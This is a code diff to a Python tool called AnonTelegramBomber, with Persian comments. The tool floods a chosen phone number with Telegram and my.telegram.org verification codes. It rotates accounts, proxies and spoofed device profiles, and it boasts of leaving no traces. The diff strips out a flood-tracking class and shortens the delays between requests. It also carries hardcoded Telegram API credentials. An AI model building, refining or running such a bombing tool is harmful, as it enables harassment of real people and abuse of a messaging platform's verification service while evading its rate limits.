@@ -10,58 +10,12 @@ import threading
 import time
 import aiohttp
 import json
-from datetime import datetime, timedelta
-
-class FloodManager:
-    """مدیریت هوشمند Flood برای اکانت‌ها"""
-    
-    def __init__(self):
-        self.flooded_accounts = {}  # {account_id: (end_time, wait_seconds)}
-        
-    def add_flood(self, account_id, wait_seconds):
-        """افزودن اکانت به لیست Flood شده"""
-        end_time = datetime.now() + timedelta(seconds=wait_seconds)
-        self.flooded_accounts[account_id] = (end_time, wait_seconds)
-        
-    def is_flooded(self, account_id):
-        """بررسی آیا اکانت Flood شده است"""
-        if account_id in self.flooded_accounts:
-            end_time, wait_seconds = self.flooded_accounts[account_id]
-            if datetime.now() < end_time:
-                remaining = (end_time - datetime.now()).seconds
-                return True, remaining
-            else:
-                # زمان Flood تمام شده
-                del self.flooded_accounts[account_id]
-                return False, 0
-        return False, 0
-
-    def get_available_account(self, accounts):
-        """دریافت یک اکانت سالم از لیست"""
-        healthy_accounts = []
-        
-        for account in accounts:
-            is_flooded, remaining = self.is_flooded(account['session'])
-            if not is_flooded:
-                healthy_accounts.append(account)
-        
-        if healthy_accounts:
-            return random.choice(healthy_accounts)
-        else:
-            return None
-
-    def get_flood_status(self):
-        """دریافت وضعیت Flood اکانت‌ها"""
-        status = []
-        for account_id, (end_time, wait_seconds) in self.flooded_accounts.items():
-            remaining = (end_time - datetime.now()).seconds
-            status.append(f"{account_id}: {remaining}s")
-        return status
 
 class AnonTelegramBomber:
     def __init__(self):
         self.accounts = [
-          {
+           
+ {
                 'session': 'account1',
                 'api_id': 26096800,
                 'api_hash': 'f4af999918de6130d434c95f9ae7db70'
@@ -97,9 +51,6 @@ class AnonTelegramBomber:
         self.mytelegram_success = 0
         self.active_attacks = 0
         
-        # سیستم مدیریت Flood
-        self.flood_manager = FloodManager()
-        
         # Enhanced device configurations
         self.device_configs = [
             {"device_model": "iPhone 15 Pro", "system_version": "iOS 17.0", "app_version": "10.0.0"},
@@ -114,9 +65,7 @@ class AnonTelegramBomber:
         os.system('cls' if os.name == 'nt' else 'clear')
 
     def print_banner(self):
-        banner = """
-                     
-        """
+        banner = """"""
         print(banner)
 
     def update_status(self, message):
@@ -128,7 +77,7 @@ class AnonTelegramBomber:
         self.clear_screen()
         self.print_banner()
         
-        print("═" * 50)
+        print("" * 0)
         print(f"📱 Available Accounts: {len(self.accounts)}")
         
         target_phone = input("🎯 Enter Target Phone Number (with country code): ").strip()
@@ -165,31 +114,17 @@ class AnonTelegramBomber:
     def get_random_proxy(self):
         return random.choice(self.proxies)
 
-    def get_available_account(self):
-        """دریافت یک اکانت سالم با سیستم مدیریت Flood"""
-        return self.flood_manager.get_available_account(self.accounts)
+    def get_random_account(self):
+        """Get a random account from available accounts"""
+        return random.choice(self.accounts)
 
     async def send_telegram_sms(self, target_phone, attempt_num):
         """ارسال کد تأیید تلگرام - نسخه واقعی"""
         session_name = self.generate_session_name()
         device_config = self.get_random_device_config()
         proxy_config = self.get_random_proxy()
+        account = self.get_random_account()
         
-        # دریافت اکانت سالم
-        account = self.get_available_account()
-        if not account:
-            self.update_status("⏳ All accounts flooded! Waiting for recovery...")
-            # پیدا کردن کوتاه‌ترین زمان انتظار
-            min_wait = 60
-            for acc in self.accounts:
-                is_flooded, remaining = self.flood_manager.is_flooded(acc['session'])
-                if is_flooded and remaining < min_wait:
-                    min_wait = remaining
-            await asyncio.sleep(min_wait + 5)
-            account = self.get_available_account()
-            if not account:
-                return False
-
         client = None
         try:
             self.update_status(f"📱 Telegram Attack #{attempt_num} starting...")
@@ -233,9 +168,8 @@ class AnonTelegramBomber:
                 
         except FloodWaitError as e:
             wait_time = e.seconds
-            # ثبت اکانت در لیست Flood شده
-            self.flood_manager.add_flood(account['session'], wait_time)
             self.update_status(f"⏳ Flood wait {wait_time}s for {account['session']}")
+            await asyncio.sleep(wait_time + 2)
             with self.display_lock:
                 self.failed_count += 1
             return False
@@ -269,12 +203,6 @@ class AnonTelegramBomber:
 
     async def send_mytelegram_sms(self, target_phone, attempt_num):
         """ارسال کد تأیید به my.telegram.org - نسخه واقعی"""
-        # دریافت اکانت سالم
-        account = self.get_available_account()
-        if not account:
-            self.update_status("⏳ All accounts flooded for my.telegram.org...")
-            return False
-
         try:
             self.update_status(f"🌐 my.telegram.org Attack #{attempt_num} starting...")
             
@@ -390,11 +318,6 @@ class AnonTelegramBomber:
                     print(f"  └── my.telegram.org: {mytelegram_success}")
                     print(f"❌ Failed: {failed_count}")
                     
-                    # نمایش وضعیت Flood اکانت‌ها
-                    flood_status = self.flood_manager.get_flood_status()
-                    if flood_status:
-                        print(f"🚫 Flooded Accounts: {', '.join(flood_status)}")
-                    
                     if self.total_attempts > 0:
                         progress = (current_attempt / self.total_attempts) * 100
                         print(f"📊 Completion: {progress:.1f}%")
@@ -427,7 +350,7 @@ class AnonTelegramBomber:
                     
                     last_display = current_display
                 
-                time.sleep(0.5)  # آپدیت هر 0.5 ثانیه
+                time.sleep(0.1)  # آپدیت هر 0.5 ثانیه
                 
             except Exception as e:
                 time.sleep(1)
@@ -442,7 +365,7 @@ class AnonTelegramBomber:
         display_thread.start()
         
         self.update_status("🚀 Initializing dual attack system...")
-        await asyncio.sleep(2)
+        await asyncio.sleep(0.5)
         
         try:
             for i in range(1, self.total_attempts + 1):
@@ -489,11 +412,6 @@ class AnonTelegramBomber:
         print(f"  └── my.telegram.org: {self.mytelegram_success}")
         print(f"❌ Failed Attacks: {self.failed_count}")
         
-        # نمایش وضعیت نهایی Flood
-        flood_status = self.flood_manager.get_flood_status()
-        if flood_status:
-            print(f"🚫 Final Flooded Accounts: {', '.join(flood_status)}")
-        
         if self.total_attempts > 0:
             success_rate = (self.success_count / self.total_attempts) * 100
             print(f"📈 Success Rate: {success_rate:.1f}%")
@@ -503,7 +421,6 @@ class AnonTelegramBomber:
         print("✅ All temporary sessions destroyed")
         print("✅ No traces left on system")
         print("✅ Multi-account rotation completed")
-        print("✅ Flood protection: ACTIVE")
         print("✅ Anonymous mode: ACTIVE")
         
         print("\n" + "═" * 50)
@@ -526,7 +443,6 @@ class AnonTelegramBomber:
             print(f"Total Attacks: {self.total_attempts}")
             print(f"Delay Range: {self.delay_range[0]}-{self.delay_range[1]}s")
             print(f"Attack Type: DUAL (Telegram + my.telegram.org)")
-            print(f"Flood Protection: ENABLED")
             
             confirm = input("\n🚀 Start the DUAL attack? (y/N): ").strip().lower()
             if confirm != 'y':
